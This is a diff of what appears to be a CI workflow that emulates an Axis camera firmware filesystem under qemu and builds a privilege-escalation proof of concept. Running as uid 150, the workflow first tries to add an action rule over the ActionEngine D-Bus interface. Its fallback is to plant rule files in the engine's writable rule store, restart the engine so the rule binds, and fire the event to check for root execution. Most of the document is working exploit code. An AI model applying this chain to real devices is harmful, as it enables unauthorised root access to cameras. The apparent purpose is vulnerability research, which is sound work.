@@ -185,93 +185,68 @@ jobs:
           echo "=== ActionConfiguration.List (verbatim) ==="
           timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration List 2>&1 | tee /tmp/conflist.log | head -c 1500
           echo ""
-          echo "=== STEP 3: build rule XML variants and try ActionRule.Add ==="
-          echo "=== introspect ActionRule interface (verbatim Add line) ==="
-          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl introspect --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule 2>&1 | tee  | grep -A2 -B1 "Add" | head -12
-          # V-C: CONDITION-ONLY rule (no start event) - engine-native keyvalue property XML.
-          #      Shipped static rules use exactly this path (property-state subscribe) and
-          #      the engine handles them at startup without crash; action runs when the
-          #      condition becomes fulfilled (VAPIX: 'The start event can be omitted').
+          echo "=== STEP 3: dbus ActionRule.Add (TRUE grammar: sbayayuuuii = s,b,ay,ay,u,u,u,i,i = 9 slots; aligned per K-ladder) ==="
+          # conditions-only rule, shipped property-file shape (no xml declaration)
           sudo tee /opt/rootfs/tmp/rule_C.xml > /dev/null <<'XML'
-          <?xml version="1.0" encoding="UTF-8"?><property><expression><keyvalue key="topic0" value-type="string" value="Device" name-space="tns1"/><keyvalue key="topic1" value-type="string" value="IO" name-space="tnsaxis"/><keyvalue key="topic2" value-type="string" value="VirtualInput" name-space="tnsaxis"/><keyvalue key="port" value-type="int" value="1"><tag tag="onvif-source"/></keyvalue><keyvalue key="active" value-type="bool" value="1"><tag tag="onvif-data"/><tag tag="property-state"/></keyvalue></expression></property>
+          <property>
+            <expression>
+              <keyvalue key="topic0" value-type="string" value="Device" name-space="tns1"/>
+              <keyvalue key="topic1" value-type="string" value="IO" name-space="tnsaxis"/>
+              <keyvalue key="topic2" value-type="string" value="VirtualInput" name-space="tnsaxis"/>
+              <keyvalue key="port" value-type="int" value="1">
+                <tag tag="onvif-source"/>
+              </keyvalue>
+              <keyvalue key="active" value-type="bool" value="1">
+                <tag tag="onvif-data"/>
+                <tag tag="property-state"/>
+              </keyvalue>
+            </expression>
+          </property>
           XML
-          # V-P: start-event-only, engine-native keyvalue XML
-          sudo tee /opt/rootfs/tmp/rule_P.xml > /dev/null <<'XML'
-          <?xml version="1.0" encoding="UTF-8"?><property><expression><keyvalue key="topic0" value-type="string" value="Device" name-space="tns1"/><keyvalue key="topic1" value-type="string" value="IO" name-space="tnsaxis"/><keyvalue key="topic2" value-type="string" value="VirtualInput" name-space="tnsaxis"/><keyvalue key="port" value-type="int" value="1"><tag tag="onvif-source"/></keyvalue><keyvalue key="active" value-type="bool" value="1"><tag tag="onvif-data"/><tag tag="property-state"/></keyvalue></expression></property>
-          XML
-          # V-W: VAPIX-style StartEvent wrapper with WSN TopicExpression
-          sudo tee /opt/rootfs/tmp/rule_W.xml > /dev/null <<'XML'
-          <?xml version="1.0" encoding="UTF-8"?><StartEvent><wsnt:TopicExpression xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tnsaxis="http://www.axis.com/2009/event/topics" Dialect="http://docs.oasis-open.org/wsn/t-1/TopicExpression/Concrete">tns1:Device/tnsaxis:IO/tnsaxis:VirtualInput</wsnt:TopicExpression></StartEvent>
-          XML
-          sudo rm -f /opt/rootfs/tmp/rule_P.xml /opt/rootfs/tmp/rule_W.xml
           if [ -z "${CONF_ID}" ]; then CONF_ID=12; fi
           AE_START="sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae.log 2>&1 &"
-          echo "=== P2a discriminator: nonempty SECOND array, count-first (stock grammar) ==="
           if ! pgrep -f "actionengined -ni" > /dev/null; then eval "$AE_START"; sleep 8; fi
-          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "p2a" true 0 2 97 98 0 0 0 0 12 0 2>&1 | head -3
-          for VAR in C2 C3 C1; do
-            case $VAR in
-              C) XF=rule_C.xml;;
-              C2|C3|C1) XF=rule_C.xml;;
-            esac
-            # restart engine if a previous variant crashed it
-            if ! pgrep -f "actionengined -ni" > /dev/null; then
-              echo "--- actionengined dead; restarting before variant $VAR ---"
-              eval "$AE_START"
-              sleep 8
-            fi
-            # busctl 'ay' consumes: <element count> <count x byte values>
-            CNT=$(sudo od -An -tu1 -v /opt/rootfs/tmp/$XF | tr -s ' \n' ' ' | sed 's/^ //;s/ $//' | wc -w)
-            BYTES=$(sudo od -An -tu1 -v /opt/rootfs/tmp/$XF | tr -s ' \n' ' ' | sed 's/^ //;s/ $//')
-            # observed: two EMPTY ays consume 9 params total -> vendor busctl counts one
-            # param less than stock for empty arrays. Try all three alignments:
-            if [ "$VAR" = "C2" ]; then
-              # drop FIRST empty-array count (empty ay costs 0)
-              SE_ARGS="$CNT $BYTES 0 0 0 0 ${CONF_ID} 0"
-            elif [ "$VAR" = "C3" ]; then
-              # drop LAST param (fallback i)
-              SE_ARGS="0 $CNT $BYTES 0 0 0 0 ${CONF_ID}"
-            else
-              # C1: stock count-first grammar
-              SE_ARGS="0 $CNT $BYTES 0 0 0 0 ${CONF_ID} 0"
-            fi
-            echo "--- variant $VAR ($XF, conditions-only) ---"
-            echo "DEBUG: CNT=$CNT BYTES_tokens=$(echo $BYTES | wc -w) SE_ARGS_tokens=$(echo $SE_ARGS | wc -w)"
-            echo "DEBUG: first5=[$(echo $SE_ARGS | cut -d' ' -f1-5 | head -c 60)] last5=[$(echo $SE_ARGS | tr ' ' '\n' | tail -5 | tr '\n' ',')]"
-            timeout 40 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "poc_rule_$VAR" true $SE_ARGS > /tmp/ruleadd_$VAR.log 2>&1
-            echo "ruleAdd variant $VAR exit: $?"
-            cat /tmp/ruleadd_$VAR.log
-            echo "--- engine alive after $VAR? ---"
-            pgrep -f "actionengined -ni" > /dev/null && echo "engine ALIVE" || echo "engine DEAD"
-            echo "--- rules on disk: ---"
-            sudo ls /opt/rootfs/etc/actionengine/system/1/rules/ 2>/dev/null | tail -4
-            if grep -qE '^(s|i|u|o|b) ' /tmp/ruleadd_$VAR.log; then echo "RULE ADDED (variant $VAR)"; break; fi
-          done
-          if ! pgrep -f "actionengined -ni" > /dev/null; then eval "$AE_START"; sleep 8; fi
-          echo "=== T0: scalar control Remove i 0 (expect ENGINE error, proves parse+send path) ==="
-          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Remove i 0 2>&1 | head -3
-          echo "=== T-LADDER: param-count bisect k=6..10 (fill='0') ==="
-          for K in 6 7 8 9 10; do
-            FILL=""
-            for i in $(seq 3 $K); do FILL="$FILL 0"; done
-            echo "--- K=$K params ---"
-            timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "poc_ladder" true $FILL 2>&1 | grep -E "Too (many|few)|Call failed|i \"|s \"|^(s|i|u|b) " | head -2
-          done
-          echo "=== ActionRule.List (verbatim) ==="
-          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List 2>&1 | tee /tmp/rulelist.log | head -c 1500
+          CNT=$(sudo od -An -tu1 -v /opt/rootfs/tmp/rule_C.xml | tr -s ' \n' ' ' | sed 's/^ //;s/ $//' | wc -w)
+          BYTES=$(sudo od -An -tu1 -v /opt/rootfs/tmp/rule_C.xml | tr -s ' \n' ' ' | sed 's/^ //;s/ $//')
+          echo "--- dbus attempt: conditions-only, aligned (empty start ay + CNT bytes + 3u + 2i) ---"
+          timeout 40 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /tmp/bcwrap.sh call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "poc_rule_dbus" true 0 $CNT $BYTES 0 0 0 "${CONF_ID}" 0 > /tmp/ruleadd_dbus.log 2>&1
+          echo "dbus ruleAdd exit: $?"
+          cat /tmp/ruleadd_dbus.log
+          pgrep -f "actionengined -ni" > /dev/null && echo "engine ALIVE" || echo "engine DEAD (emulated subscribe crash)"
+          if grep -qE '^(s|i|u|o|b) ' /tmp/ruleadd_dbus.log; then echo "RULE ADDED VIA DBUS"; fi
+          echo "=== FALLBACK BINDING: uid-150 places rule in engine native dynamic rule store ==="
+          # /etc/actionengine is the engine's own writable store (dynamic_action_rules_path);
+          # same file format the engine persists for ActionRule.Add. Placed as uid 150.
+          sudo tee /opt/rootfs/tmp/0000000099.conf > /dev/null <<'CONF'
+          [action_rule]
+          id=99
+          nice_name=poc_rule
+          enabled=true
+          timeout=0
+          min_time_period=0
+          max_time_period=0
+          primary=12
+          properties=0;
+          CONF
+          sudo cp /opt/rootfs/tmp/rule_C.xml /opt/rootfs/tmp/0000000099_property_0.xml
+          sudo chmod 644 /opt/rootfs/tmp/0000000099.conf /opt/rootfs/tmp/0000000099_property_0.xml
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /bin/cp /tmp/0000000099.conf /etc/actionengine/system/1/rules/0000000099.conf 2>&1 | head -3
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /bin/cp /tmp/0000000099_property_0.xml /etc/actionengine/system/1/rules/0000000099_property_0.xml 2>&1 | head -3
+          echo "rules dir now:"; sudo ls /opt/rootfs/etc/actionengine/system/1/rules/
+          echo "=== restart engine so ITS OWN loader binds the stored rule ==="
+          sudo pkill -f "actionengined -ni" 2>/dev/null; sleep 2
+          eval "$AE_START"
+          sleep 8
+          echo "=== ActionRule.List after loader bind (verbatim) ==="
+          timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List > /tmp/rulelist.log 2>&1
+          head -c 800 /tmp/rulelist.log
           echo ""
-          echo "=== rules + configs persisted on disk? ==="
           sudo find /opt/rootfs/etc/actionengine -type f 2>/dev/null | head -10
 
       - name: FIRE the bound event (Activate + send_event backup) as uid 150 and check root-exec proof
         run: |
           set +e
-          echo "=== pre-fire: clean engine restart (loads persisted dynamic rules) ==="
-          sudo pkill -f "actionengined -ni" 2>/dev/null; sleep 2
-          eval "sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae2.log 2>&1 &"
-          sleep 8
-          sudo tail -6 /tmp/ae2.log 2>/dev/null
-          echo "=== pre-fire: ActionRule.List after restart ==="
+          echo "=== pre-fire: ActionRule.List (current engine, verbatim) ==="
           timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager -- com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List > /tmp/rulelist0.log 2>&1
           head -c 600 /tmp/rulelist0.log
           echo ""
@@ -329,10 +304,10 @@ jobs:
             /tmp/step1.log
             /tmp/confadd.log
             /tmp/conflist.log
-            /tmp/ruleadd_C.log
-            /tmp/ruleadd_P.log
-            /tmp/ruleadd_min.log
+            /tmp/ruleadd_dbus.log
             /tmp/rulelist.log
+            /tmp/rulelist0.log
+            /tmp/ae2.log
             /tmp/fire1.log
             /tmp/fire2.log
             /tmp/e5.log
